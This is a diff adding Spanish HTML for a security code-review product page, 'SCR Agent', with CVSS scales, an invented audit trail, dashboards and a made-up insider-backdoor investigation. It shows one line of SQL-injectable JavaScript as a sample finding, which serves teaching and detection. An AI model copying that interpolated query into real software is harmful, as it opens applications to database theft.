+                        </div>
+                        <div class="cvss-scale">
+                            <div class="cvss-label">0.1 - 3.9</div>
+                            <div class="cvss-band low">🟢 BAJO</div>
+                            <div class="cvss-desc">Impacto mínimo, difícil de explotar, o requiere permisos</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="criticidad-section">
+                    <h3>🔍 Factores de CVSS Considerados</h3>
+                    <div class="factors-grid">
+                        <div class="factor-card">
+                            <h4>Vector de Acceso</h4>
+                            <p><strong>Remoto:</strong> Máximo riesgo<br>
+                            <strong>Local:</strong> Riesgo menor<br>
+                            <strong>Física:</strong> Riesgo mínimo</p>
+                        </div>
+                        <div class="factor-card">
+                            <h4>Complejidad de Ataque</h4>
+                            <p><strong>Baja:</strong> Se explota fácilmente<br>
+                            <strong>Alta:</strong> Requiere bypass de seguridad</p>
+                        </div>
+                        <div class="factor-card">
+                            <h4>Privilegios Requeridos</h4>
+                            <p><strong>Ninguno:</strong> Máximo riesgo<br>
+                            <strong>Usuario:</strong> Riesgo medio<br>
+                            <strong>Admin:</strong> Riesgo bajo</p>
+                        </div>
+                        <div class="factor-card">
+                            <h4>Impacto de Confidencialidad</h4>
+                            <p><strong>Alto:</strong> Datos sensibles expuestos<br>
+                            <strong>Parcial:</strong> Algunos datos afectados<br>
+                            <strong>Ninguno:</strong> Sin exposición</p>
+                        </div>
+                        <div class="factor-card">
+                            <h4>Impacto de Integridad</h4>
+                            <p><strong>Alto:</strong> Modificación sin restricción<br>
+                            <strong>Parcial:</strong> Cambios limitados<br>
+                            <strong>Ninguno:</strong> No afectada</p>
+                        </div>
+                        <div class="factor-card">
+                            <h4>Impacto de Disponibilidad</h4>
+                            <p><strong>Alto:</strong> Servicio no disponible<br>
+                            <strong>Parcial:</strong> Degradación de servicio<br>
+                            <strong>Ninguno:</strong> No afectada</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="criticidad-section">
+                    <h3>⚖️ Ponderación en SCR Agent</h3>
+                    <div class="ponderacion-table">
+                        <div class="pond-row header">
+                            <div>Factor</div>
+                            <div>Peso</div>
+                            <div>Justificación</div>
+                        </div>
+                        <div class="pond-row">
+                            <div><strong>CVSS Score</strong></div>
+                            <div>50%</div>
+                            <div>Métrica estándar de la industria, base técnica</div>
+                        </div>
+                        <div class="pond-row">
+                            <div><strong>Contexto de la App</strong></div>
+                            <div>20%</div>
+                            <div>¿Es app crítica? ¿Maneja datos sensibles?</div>
+                        </div>
+                        <div class="pond-row">
+                            <div><strong>Exposición de Datos</strong></div>
+                            <div>15%</div>
+                            <div>¿Qué tipo de datos está en riesgo?</div>
+                        </div>
+                        <div class="pond-row">
+                            <div><strong>Antigüedad del Hallazgo</strong></div>
+                            <div>10%</div>
+                            <div>¿Cuánto tiempo lleva sin remediarse?</div>
+                        </div>
+                        <div class="pond-row">
+                            <div><strong>Exploitabilidad Real</strong></div>
+                            <div>5%</div>
+                            <div>¿Se conocen exploits públicos?</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="criticidad-section">
+                    <h3>📋 Ejemplos de Clasificación</h3>
+                    <div class="ejemplos-criticidad">
+                        <div class="ejemplo-crit critical">
+                            <h4>🔴 CRÍTICO: SQL Injection en Login</h4>
+                            <p><strong>CVSS:</strong> 9.8 | <strong>Contexto:</strong> App web pública | <strong>Datos:</strong> Bases de datos de usuarios</p>
+                            <p><strong>Por qué:</strong> Fácil de explotar (acceso remoto, sin autenticación), impacto máximo (acceso a BD completa)</p>
+                        </div>
+                        <div class="ejemplo-crit high">
+                            <h4>🟠 ALTO: XSS en Formulario</h4>
+                            <p><strong>CVSS:</strong> 6.1 | <strong>Contexto:</strong> Datos de usuario | <strong>Datos:</strong> Sesiones, cookies</p>
+                            <p><strong>Por qué:</strong> Se puede explotar remotamente pero requiere que el usuario interactúe</p>
+                        </div>
+                        <div class="ejemplo-crit medium">
+                            <h4>🟡 MEDIO: Configuración Débil en Staging</h4>
+                            <p><strong>CVSS:</strong> 5.3 | <strong>Contexto:</strong> Servidor no producción | <strong>Datos:</strong> Datos de prueba</p>
+                            <p><strong>Por qué:</strong> Impacto moderado, pero es entorno de staging, no crítico</p>
+                        </div>
+                        <div class="ejemplo-crit low">
+                            <h4>🟢 BAJO: Comentario TODO con Contraseña</h4>
+                            <p><strong>CVSS:</strong> 3.1 | <strong>Contexto:</strong> Código fuente privado | <strong>Datos:</strong> Cuenta de prueba</p>
+                            <p><strong>Por qué:</strong> Requiere acceso al código fuente (no remoto), contraseña es de prueba no producción</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trazabilidad y Seguimiento -->
+    <section id="trazabilidad" class="trazabilidad">
+        <div class="container">
+            <h2 class="section-title">Trazabilidad y Seguimiento</h2>
+            <p class="section-subtitle">Sistema completo de rastreo desde detección hasta resolución</p>
+
+            <!-- Circular Status Track -->
+            <div class="circular-track">
+                <!-- SVG Connection Lines -->
+                <svg class="track-connections" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;">
+                    <defs>
+                        <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#F97316;stop-opacity:0.8" />
+                            <stop offset="50%" style="stop-color:#F97316;stop-opacity:0.4" />
+                            <stop offset="100%" style="stop-color:#F97316;stop-opacity:0.8" />
+                        </linearGradient>
+                    </defs>
+                    <!-- Pentagon connecting lines -->
+                    <polygon points="50%,10% 90%,27% 72%,78% 28%,78% 10%,27%"
+                             fill="none" stroke="url(#lineGradient)" stroke-width="2"
+                             stroke-dasharray="500" stroke-dashoffset="500"
+                             style="animation: drawPath 4s ease-in-out infinite;" />
+                </svg>
+                <div class="track-center">
+                    <div class="center-content">
+                        <h3>5 Etapas</h3>
+                        <p>de Seguimiento</p>
+                    </div>
+                </div>
+                <div class="track-stages">
+                    <div class="stage stage-1 stage-interactive" style="--index: 0" onclick="showStageDetails(this, 'deteccion')" data-stage="deteccion">
+                        <div class="stage-circle">
+                            <span class="stage-icon">🔍</span>
+                        </div>
+                        <div class="stage-label">Detección</div>
+                        <div class="stage-time">0-5 min</div>
+                    </div>
+                    <div class="stage stage-2 stage-interactive" style="--index: 1" onclick="showStageDetails(this, 'analisis')" data-stage="analisis">
+                        <div class="stage-circle">
+                            <span class="stage-icon">📊</span>
+                        </div>
+                        <div class="stage-label">Análisis</div>
+                        <div class="stage-time">5-15 min</div>
+                    </div>
+                    <div class="stage stage-3 stage-interactive" style="--index: 2" onclick="showStageDetails(this, 'reporte')" data-stage="reporte">
+                        <div class="stage-circle">
+                            <span class="stage-icon">📄</span>
+                        </div>
+                        <div class="stage-label">Reporte</div>
+                        <div class="stage-time">15-20 min</div>
+                    </div>
+                    <div class="stage stage-4 stage-interactive" style="--index: 3" onclick="showStageDetails(this, 'remediacion')" data-stage="remediacion">
+                        <div class="stage-circle">
+                            <span class="stage-icon">⚙️</span>
+                        </div>
+                        <div class="stage-label">Remediación</div>
+                        <div class="stage-time">20h-48h</div>
+                    </div>
+                    <div class="stage stage-5 stage-interactive" style="--index: 4" onclick="showStageDetails(this, 'cierre')" data-stage="cierre">
+                        <div class="stage-circle">
+                            <span class="stage-icon">✅</span>
+                        </div>
+                        <div class="stage-label">Cierre</div>
+                        <div class="stage-time">48h+</div>
+                    </div>
+                </div>
+
+                <!-- Stage Details Panel -->
+                <div id="stageDetailsPanel" class="stage-details-panel">
+                    <div class="stage-details-content">
+                        <button class="stage-details-close" onclick="closeStageDetails()">✕</button>
+                        <h3 id="stageDetailsTitle" style="color: var(--primary); margin-bottom: 15px;"></h3>
+                        <div id="stageDetailsBody" style="color: var(--text-secondary); line-height: 1.8;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="margin-top: 60px; margin-bottom: 30px; text-align: center;">Historial Completo de Auditoría</h3>
+
+            <div class="audit-timeline">
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 14:35:22</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Detección Completada</div>
+                    <div class="audit-details">Hallazgo #HR-2024-001 identificado: SQL Injection en auth/login.js:45</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 14:35:28</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Análisis Profundo</div>
+                    <div class="audit-details">CVSS Score: 9.8 | Contexto: App crítica | Impacto: CRÍTICO</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 14:35:45</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Solución Generada</div>
+                    <div class="audit-details">Código solución propuesto: Prepared statements con parametrización</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 14:36:00</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Reporte Generado</div>
+                    <div class="audit-details">PDF exportado | JSON enviado a webhook | Notificación enviada</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 15:12:33</div>
+                    <div class="audit-user">john.dev@company.com</div>
+                    <div class="audit-action">Estado Actualizado</div>
+                    <div class="audit-details">ABIERTO → EN CURSO | Asignado a: john.dev@company.com</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 16:45:10</div>
+                    <div class="audit-user">john.dev@company.com</div>
+                    <div class="audit-action">Nota Agregada</div>
+                    <div class="audit-details">Implementando fix. Cambio propuesto en rama: fix/sql-injection-auth</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 18:22:50</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Re-test Automático</div>
+                    <div class="audit-details">Vulnerabilidad reconfirmada en rama develop. Fix válido en feature branch.</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-07 18:23:05</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">PR Detectado</div>
+                    <div class="audit-details">Pull Request #542 abierto: "Fix: SQL injection in login" | Diff validado</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-08 09:15:30</div>
+                    <div class="audit-user">sarah.review@company.com</div>
+                    <div class="audit-action">Revisión Aprobada</div>
+                    <div class="audit-details">Code review completado | Cambios aceptados | PR merged to main</div>
+                </div>
+
+                <div class="audit-entry">
+                    <div class="audit-time">2024-04-08 09:16:02</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">Validación Final</div>
+                    <div class="audit-details">Re-test en rama main: PASS ✓ | Vulnerabilidad resuelta | SLA: 18h 40m</div>
+                </div>
+
+                <div class="audit-entry success">
+                    <div class="audit-time">2024-04-08 09:16:20</div>
+                    <div class="audit-user">Sistema</div>
+                    <div class="audit-action">🎉 CIERRE COMPLETADO</div>
+                    <div class="audit-details">Hallazgo resuelto | Historial archivado | Notificación enviada a stakeholders</div>
+                </div>
+            </div>
+
+            <div class="traceability-stats">
+                <div class="stat-box">
+                    <h4>Tiempo Total</h4>
+                    <p class="stat-value">18h 41m</p>
+                    <p class="stat-desc">Desde detección hasta cierre</p>
+                </div>
+                <div class="stat-box">
+                    <h4>Eventos Registrados</h4>
+                    <p class="stat-value">11</p>
+                    <p class="stat-desc">Cada acción es auditable</p>
+                </div>
+                <div class="stat-box">
+                    <h4>Usuarios Involucrados</h4>
+                    <p class="stat-value">3</p>
+                    <p class="stat-desc">Sistema + 2 desarrolladores</p>
+                </div>
+                <div class="stat-box">
+                    <h4>SLA Cumplido</h4>
+                    <p class="stat-value">✓ 24h</p>
+                    <p class="stat-desc">Resuelto en tiempo</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Dashboard Live -->
+    <section id="dashboard" class="dashboard-section">
+        <div class="container">
+            <h2 class="section-title">Dashboard en Vivo</h2>
+            <p class="section-subtitle">Sistema integrado de monitoreo y gestión</p>
+
+            <div class="dashboard-preview">
+                <div class="dashboard-mockup">
+                    <div class="mockup-header">
+                        <div class="mockup-logo">SCR Agent Dashboard</div>
+                        <div class="mockup-tabs">
+                            <span class="tab active">Monitor Central</span>
+                            <span class="tab">Incidentes</span>
+                            <span class="tab">Amenazas</span>
+                            <span class="tab">Remediación</span>
+                            <span class="tab">Forense</span>
+                        </div>
+                    </div>
+
+                    <div class="mockup-content">
+                        <!-- Tab: Monitor Central -->
+                        <div class="dashboard-tab-content active" id="tab-monitor">
+                            <div class="dashboard-grid">
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Hallazgos Detectados</div>
+                                    <div class="card-value">42</div>
+                                    <div class="card-trend">↑ 8 nuevos hoy</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Críticos</div>
+                                    <div class="card-value threat">6</div>
+                                    <div class="card-trend warning">Atención inmediata</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Resueltos</div>
+                                    <div class="card-value success">28</div>
+                                    <div class="card-trend">67% completados</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">En Seguimiento</div>
+                                    <div class="card-value">8</div>
+                                    <div class="card-trend">En remediación</div>
+                                </div>
+                            </div>
+
+                            <div class="dashboard-row">
+                                <div class="dashboard-chart">
+                                    <h4>Hallazgos por Severidad</h4>
+                                    <canvas id="severityChart" class="chart-canvas"></canvas>
+                                </div>
+
+                                <div class="dashboard-incidents">
+                                    <h4>Últimos Hallazgos</h4>
+                                    <div class="incident-item critical">
+                                        <span class="incident-name">SQL Injection en login.js</span>
+                                        <span class="incident-time">Hace 2h</span>
+                                    </div>
+                                    <div class="incident-item critical">
+                                        <span class="incident-name">XSS en formulario contacto</span>
+                                        <span class="incident-time">Hace 4h</span>
+                                    </div>
+                                    <div class="incident-item high">
+                                        <span class="incident-name">Config Insegura en .env</span>
+                                        <span class="incident-time">Hace 6h</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Tab: Incidentes -->
+                        <div class="dashboard-tab-content" id="tab-incidentes">
+                            <div class="dashboard-grid">
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Incidentes Abiertos</div>
+                                    <div class="card-value threat">12</div>
+                                    <div class="card-trend warning">Requieren acción</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">En Progreso</div>
+                                    <div class="card-value">5</div>
+                                    <div class="card-trend">Siendo remediados</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Resueltos Hoy</div>
+                                    <div class="card-value success">8</div>
+                                    <div class="card-trend">SLA cumplido</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Tiempo Promedio</div>
+                                    <div class="card-value">4.2h</div>
+                                    <div class="card-trend">Para resolver</div>
+                                </div>
+                            </div>
+                            <div class="dashboard-row" style="margin-top: 30px;">
+                                <div class="dashboard-chart" style="width: 100%;">
+                                    <h4>Tendencia de Incidentes (últimos 7 días)</h4>
+                                    <canvas id="trendChart" class="chart-canvas"></canvas>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Tab: Amenazas -->
+                        <div class="dashboard-tab-content" id="tab-amenazas">
+                            <div class="dashboard-grid">
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Vulnerabilidades</div>
+                                    <div class="card-value">42</div>
+                                    <div class="card-trend">Todas categorizadas</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">OWASP Top 10</div>
+                                    <div class="card-value threat">7</div>
+                                    <div class="card-trend warning">Detectadas</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Confianza Promedio</div>
+                                    <div class="card-value success">94%</div>
+                                    <div class="card-trend">Alta precisión</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Patrones únicos</div>
+                                    <div class="card-value">23</div>
+                                    <div class="card-trend">Identificados</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Tab: Remediación -->
+                        <div class="dashboard-tab-content" id="tab-remediacion">
+                            <div class="dashboard-grid">
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Soluciones Propuestas</div>
+                                    <div class="card-value">42</div>
+                                    <div class="card-trend">100% cobertura</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Implementadas</div>
+                                    <div class="card-value success">28</div>
+                                    <div class="card-trend">66% completadas</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">En Validación</div>
+                                    <div class="card-value">8</div>
+                                    <div class="card-trend">Siendo testeadas</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Falsos Positivos</div>
+                                    <div class="card-value low">6</div>
+                                    <div class="card-trend">14% revisión</div>
+                                </div>
+                            </div>
+                            <div class="dashboard-row" style="margin-top: 30px;">
+                                <div class="dashboard-chart" style="width: 60%; margin: 0 auto;">
+                                    <h4>Estado de Remediación</h4>
+                                    <canvas id="remediationChart" class="chart-canvas"></canvas>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Tab: Forense -->
+                        <div class="dashboard-tab-content" id="tab-forense">
+                            <div class="dashboard-grid">
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Cambios Analizados</div>
+                                    <div class="card-value">1,243</div>
+                                    <div class="card-trend">En 30 días</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Usuarios Monitoreados</div>
+                                    <div class="card-value">28</div>
+                                    <div class="card-trend">Active developers</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Repos Bajo Vigilancia</div>
+                                    <div class="card-value">12</div>
+                                    <div class="card-trend">100% coverage</div>
+                                </div>
+                                <div class="dashboard-card stat-card">
+                                    <div class="card-label">Anomalías Detectadas</div>
+                                    <div class="card-value warning">3</div>
+                                    <div class="card-trend">Siendo investigadas</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Agente Forense en Acción -->
+    <section id="forense-accion" class="forense-section">
+        <div class="container">
+            <h2 class="section-title">🔬 Agente Forense en Acción</h2>
+            <p class="section-subtitle">Investigación profunda de cambios, patrones y correlaciones de seguridad</p>
+
+            <div class="forense-grid">
+                <!-- Timeline Visualization -->
+                <div class="forense-card timeline-card">
+                    <div class="card-header">
+                        <h3>📅 Timeline de Cambios</h3>
+                        <p>Historial de commits correlacionado con vulnerabilidades</p>
+                    </div>
+                    <div class="timeline-visualization">
+                        <div class="timeline-item critical">
+                            <div class="timeline-marker">
+                                <span class="marker-badge critical">1</span>
+                            </div>
+                            <div class="timeline-content">
+                                <h4>Commit Malicioso Detectado</h4>
+                                <p><strong>Autor:</strong> dev.contractor@external.com</p>
+                                <p><strong>Hash:</strong> a3f7e9c2d</p>
+                                <p><strong>Mensaje:</strong> "Update auth validation"</p>
+                                <p class="risk">⚠️ <strong>Riesgo:</strong> SQL Injection inyectado en query de login</p>
+                            </div>
+                        </div>
+
+                        <div class="timeline-arrow"></div>
+
+                        <div class="timeline-item warning">
+                            <div class="timeline-marker">
+                                <span class="marker-badge warning">2</span>
+                            </div>
+                            <div class="timeline-content">
+                                <h4>Patrón Anómalo Detectado</h4>
+                                <p><strong>Usuario:</strong> contractor account</p>
+                                <p><strong>Cambios:</strong> 47 commits en 3 horas</p>
+                                <p><strong>Archivos:</strong> auth/, database/, admin/</p>
+                                <p class="risk">⚠️ <strong>Anomalía:</strong> Patrón de trabajo sospechoso</p>
+                            </div>
+                        </div>
+
+                        <div class="timeline-arrow"></div>
+
+                        <div class="timeline-item success">
+                            <div class="timeline-marker">
+                                <span class="marker-badge success">3</span>
+                            </div>
+                            <div class="timeline-content">
+                                <h4>Correlación de Eventos</h4>
+                                <p><strong>Evento 1:</strong> Commits a auth/ module</p>
+                                <p><strong>Evento 2:</strong> Múltiples failed logins (later discovered)</p>
+                                <p><strong>Relación:</strong> Vulnerabilidad inyectada hace 3 semanas</p>
+                                <p class="success-text">✓ <strong>Insight:</strong> Vulnerabilidad permaneció dormida, explorable tras commit</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- User Behavior Analysis -->
+                <div class="forense-card behavior-card">
+                    <div class="card-header">
+                        <h3>👥 Análisis de Comportamiento</h3>
+                        <p>Patrones de actividad e identificación de riesgos</p>
+                    </div>
+                    <div class="behavior-analysis">
+                        <div class="user-profile">
+                            <div class="profile-header critical">
+                                <h4>Perfil de Riesgo: Alto</h4>
+                                <p>contractor@external.com</p>
+                            </div>
+                            <div class="behavior-metrics">
+                                <div class="metric">
+                                    <span class="metric-label">Commits Críticos</span>
+                                    <div class="metric-bar">
+                                        <div class="metric-fill critical" style="width: 85%;"></div>
+                                    </div>
+                                    <span class="metric-value">47</span>
+                                </div>
+                                <div class="metric">
+                                    <span class="metric-label">Modificaciones a Auth</span>
+                                    <div class="metric-bar">
+                                        <div class="metric-fill warning" style="width: 92%;"></div>
+                                    </div>
+                                    <span class="metric-value">23</span>
+                                </div>
+                                <div class="metric">
+                                    <span class="metric-label">Cambios sin PR</span>
+                                    <div class="metric-bar">
+                                        <div class="metric-fill critical" style="width: 78%;"></div>
+                                    </div>
+                                    <span class="metric-value">12</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="risk-factors">
+                            <h5>Factores de Riesgo Identificados</h5>
+                            <ul>
+                                <li>🚨 Acceso con credenciales de contratista externo</li>
+                                <li>🚨 Cambios directos a rama main (sin PR review)</li>
+                                <li>⚠️ Commits fuera de horas de oficina (3am-5am)</li>
+                                <li>⚠️ Modificaciones a módulos críticos (auth, database)</li>
+                                <li>⚠️ Patrones diferentes a equipo interno</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Repository Risk Analysis -->
+                <div class="forense-card repo-card">
+                    <div class="card-header">
+                        <h3>🏗️ Análisis de Repositorios</h3>
+                        <p>Identificación de áreas de riesgo por módulo</p>
+                    </div>
+                    <div class="repo-analysis">
+                        <div class="repo-item critical">
+                            <div class="repo-name">banking/auth</div>
+                            <div class="repo-details">
+                                <span class="badge critical">CRÍTICO</span>
+                                <span class="detail">12 vulnerabilidades</span>
+                                <span class="detail">5 cambios sospechosos</span>
+                            </div>
+                            <div class="repo-risk-bar">
+                                <div class="risk-fill critical" style="width: 95%;"></div>
+                            </div>
+                        </div>
+
+                        <div class="repo-item warning">
+                            <div class="repo-name">api/endpoints</div>
+                            <div class="repo-details">
+                                <span class="badge warning">ALTO</span>
+                                <span class="detail">7 vulnerabilidades</span>
+                                <span class="detail">2 patrones anómalos</span>
+                            </div>
+                            <div class="repo-risk-bar">
+                                <div class="risk-fill warning" style="width: 68%;"></div>
+                            </div>
+                        </div>
+
+                        <div class="repo-item medium">
+                            <div class="repo-name">database/queries</div>
+                            <div class="repo-details">
+                                <span class="badge medium">MEDIO</span>
+                                <span class="detail">3 vulnerabilidades</span>
+                                <span class="detail">1 correlación detectada</span>
+                            </div>
+                            <div class="repo-risk-bar">
+                                <div class="risk-fill medium" style="width: 45%;"></div>
+                            </div>
+                        </div>
+
+                        <div class="repo-item low">
+                            <div class="repo-name">utils/helpers</div>
+                            <div class="repo-details">
+                                <span class="badge low">BAJO</span>
+                                <span class="detail">0 vulnerabilidades</span>
+                                <span class="detail">Cambios normales</span>
+                            </div>
+                            <div class="repo-risk-bar">
+                                <div class="risk-fill low" style="width: 12%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Forensic Insights -->
+                <div class="forense-card insights-card">
+                    <div class="card-header">
+                        <h3>💡 Insights Forenses</h3>
+                        <p>Conclusiones del análisis investigativo</p>
+                    </div>
+                    <div class="insights-list">
+                        <div class="insight-item critical">
+                            <span class="insight-icon">🔴</span>
+                            <div>
+                                <h5>Vulnerabilidad Intencional</h5>
+                                <p>El patrón de commits sugiere inyección deliberada de SQL Injection para obtener acceso no autorizado a datos bancarios</p>
+                            </div>
+                        </div>
+
+                        <div class="insight-item warning">
+                            <span class="insight-icon">🟠</span>
+                            <div>
+                                <h5>Período de Exposición Crítico</h5>
+                                <p>Vulnerabilidad estuvo activa durante 21 días antes de ser detectada por SCR Agent</p>
+                            </div>
+                        </div>
+
+                        <div class="insight-item medium">
+                            <span class="insight-icon">🟡</span>
+                            <div>
+                                <h5>Impacto Potencial</h5>
+                                <p>Acceso completo a 2.3M cuentas bancarias, transacciones, y datos de clientes</p>
+                            </div>
+                        </div>
+
+                        <div class="insight-item success">
+                            <span class="insight-icon">🟢</span>
+                            <div>
+                                <h5>Respuesta Efectiva</h5>
+                                <p>Detectado antes de explotación activa, remediado en 18h 40m, cuenta de contractor desactivada</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Reporte en Vivo -->
+    <section id="reporte-vivo" class="reporte-section">
+        <div class="container">
+            <h2 class="section-title">📊 Reporte en Vivo</h2>
+            <p class="section-subtitle">Cómo SCR Agent presenta hallazgos y remediaciones en la plataforma</p>
+
+            <div class="reporte-mockup">
+                <!-- Report Header -->
+                <div class="report-header">
+                    <div class="report-title-section">
+                        <h3>Análisis de Seguridad - FinTech Solutions</h3>
+                        <p class="report-date">📅 04 de abril de 2024 | 🕐 14:32:10</p>
+                    </div>
+                    <div class="report-score">
+                        <div class="risk-gauge critical">
+                            <div class="gauge-value">CRÍTICO</div>
+                            <div class="gauge-detail">9.8 / 10.0</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Report Tabs -->
+                <div class="report-tabs-container">
+                    <div class="report-tab active">Hallazgos</div>
+                    <div class="report-tab">Remediación</div>
+                    <div class="report-tab">Forense</div>
+                    <div class="report-tab">Timeline</div>
+                </div>
+
+                <!-- Report Content -->
+                <div class="report-content">
+                    <!-- Findings Section -->
+                    <div class="report-section-content active">
+                        <h4>Vulnerabilidades Detectadas (12 Críticas)</h4>
+                        <div class="findings-list">
+                            <div class="finding-card critical">
+                                <div class="finding-header">
+                                    <span class="finding-icon">⚠️</span>
+                                    <h5>SQL Injection en Query de Transferencias</h5>
+                                    <span class="severity-badge critical">CRÍTICO 9.8</span>
+                                </div>
+                                <div class="finding-details">
+                                    <p><strong>Archivo:</strong> banking/transfers.js:123</p>
+                                    <p><strong>Confianza:</strong> 98% | <strong>Clase:</strong> OWASP A03:2021 – Injection</p>
+                                    <div class="code-snippet vulnerable">
+                                        <span class="code-label">Código Vulnerable:</span>
+                                        <pre>const query = `SELECT balance FROM accounts WHERE id = ${accountId}`;</pre>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="finding-card critical">
+                                <div class="finding-header">
+                                    <span class="finding-icon">⚠️</span>
+                                    <h5>Backdoor Administrativo</h5>
+                                    <span class="severity-badge critical">CRÍTICO 9.9</span>
+                                </div>
+                                <div class="finding-details">
+                                    <p><strong>Archivo:</strong> auth/login.js:234</p>
+                                    <p><strong>Confianza:</strong> 100% | <strong>Clase:</strong> Intentional Compromise</p>
+                                </div>
+                            </div>
+
+                            <div class="finding-card high">
+                                <div class="finding-header">
+                                    <span class="finding-icon">⚠️</span>
+                                    <h5>Cross-Site Scripting (XSS) en Dashboard</h5>
+                                    <span class="severity-badge high">ALTO 7.5</span>
+                                </div>
+                                <div class="finding-details">
+                                    <p><strong>Archivo:</strong> frontend/dashboard.jsx:456</p>
+                                    <p><strong>Confianza:</strong> 85% | <strong>Clase:</strong> OWASP A03:2021 – Injection</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Remediation Section -->
+                    <div class="report-section-content">
+                        <h4>Plan de Remediación</h4>
+                        <div class="remediation-plan">
+                            <div class="remediation-step">
+                                <div class="step-number critical">1</div>
+                                <div class="step-content">
+                                    <h5>SQL Injection - Prepared Statements</h5>
+                                    <p>Implementar prepared statements con parámetros vinculados</p>
+                                    <p><strong>Plazo:</strong> 4 horas | <strong>Complejidad:</strong> Alta</p>
+                                </div>
+                            </div>
+
+                            <div class="remediation-step">
+                                <div class="step-number critical">2</div>
+                                <div class="step-content">
+                                    <h5>Remover Backdoor</h5>
+                                    <p>Eliminar contraseña maestra y revertir cambios maliciosos</p>
+                                    <p><strong>Plazo:</strong> 1 hora | <strong>Complejidad:</strong> Media</p>
+                                </div>
+                            </div>
+
+                            <div class="remediation-step">
+                                <div class="step-number high">3</div>
+                                <div class="step-content">
+                                    <h5>Sanitización de XSS</h5>
+                                    <p>Usar text nodes en lugar de dangerouslySetInnerHTML</p>
+                                    <p><strong>Plazo:</strong> 2 horas | <strong>Complejidad:</strong> Media</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Forensic Section -->
+                    <div class="report-section-content">
+                        <h4>Análisis Forense</h4>
+                        <div class="forensic-findings">
+                            <div class="forensic-item">
+                                <h5>📅 Timeline de Descubrimiento</h5>
+                                <ul>
+                                    <li><strong>2024-04-07 02:15:00</strong> - Scan automático detectó SQL Injection</li>
+                                    <li><strong>2024-04-07 02:32:00</strong> - Analysis Engine identificó Backdoor</li>
+                                    <li><strong>2024-04-07 03:45:00</strong> - Forensic module encontró correlación: mismo autor</li>
+                                    <li><strong>2024-04-07 04:20:00</strong> - Reporte generado y enviado a equipo</li>
+                                </ul>
+                            </div>
+
+                            <div class="forensic-item">
+                                <h5>👤 Usuario Sospechoso</h5>
+                                <p><strong>Cuenta:</strong> contractor@external.com</p>
+                                <p><strong>Últimos commits:</strong> 47 en 3 horas (fuera de horas laborales)</p>
+                                <p><strong>Archivos modificados:</strong> auth/, banking/, config/</p>
+                                <p><strong>Riesgo:</strong> ALTO - Patrón anómalo identificado</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Timeline Section -->
+                    <div class="report-section-content">
